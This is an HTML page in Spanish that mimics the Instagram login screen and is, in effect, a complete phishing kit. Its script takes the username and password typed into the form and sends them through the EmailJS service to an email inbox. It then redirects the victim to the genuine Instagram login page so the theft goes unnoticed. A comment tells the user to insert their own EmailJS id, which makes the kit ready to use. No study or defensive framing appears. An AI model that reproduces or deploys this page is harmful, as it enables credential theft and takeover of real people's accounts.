<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión en Instagram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 350px;
            width: 90%;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 100%;
            max-width: 175px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
        }
        .form-group button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 3px;
            font-weight: bold;
            cursor: pointer;
        }
        .form-group button:disabled {
            background-color: #b2dffc;
        }
        .separator {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .separator div {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .separator span {
            margin: 0 10px;
            color: #8e8e8e;
            font-weight: bold;
        }
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #1877f2;
            color: #fff;
            padding: 10px;
            border-radius: 3px;
            text-decoration: none;
            margin-bottom: 20px;
        }
        .fb-login img {
            width: 20px;
            margin-right: 10px;
        }
        .login-link {
            margin-top: 20px;
        }
        .login-link a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }
        /* Responsive Styles */
        @media (min-width: 768px) {
            .container {
                max-width: 400px;
                padding: 30px;
            }
            .form-group input, .form-group button {
                padding: 15px;
            }
        }
    </style>
    <!-- Include EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("8GxATC_mkACaUczc_"); // Reemplaza con tu user_id de EmailJS
        })();
    </script>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
        </div>
        <form id="login-form">
            <div class="form-group">
                <input type="text" name="username" id="username" placeholder="Nombre de usuario" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" id="password" placeholder="Contraseña" required>
            </div>
            <div class="form-group">
                <button type="submit" id="login-button">Iniciar Sesión</button>
            </div>
        </form>
        <div class="separator">
            <div></div>
            <span>o</span>
            <div></div>
        </div>
        <a href="#" class="fb-login">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
            Iniciar sesión con Facebook
        </a>
        <div class="login-link">
            <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
        </div>
    </div>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            emailjs.send("instagram", "template_k8pql7p", {
                username: username,
                password: password
            })
            .then((response) => {
                console.log('Correo enviado correctamente', response.status, response.text);
                // Redirigir a la página real de Instagram
                window.location.href = "https://www.instagram.com/accounts/login/";
            }, (error) => {
                console.error('Error al enviar el correo', error);
            });
        });
    </script>
</body>
</html>
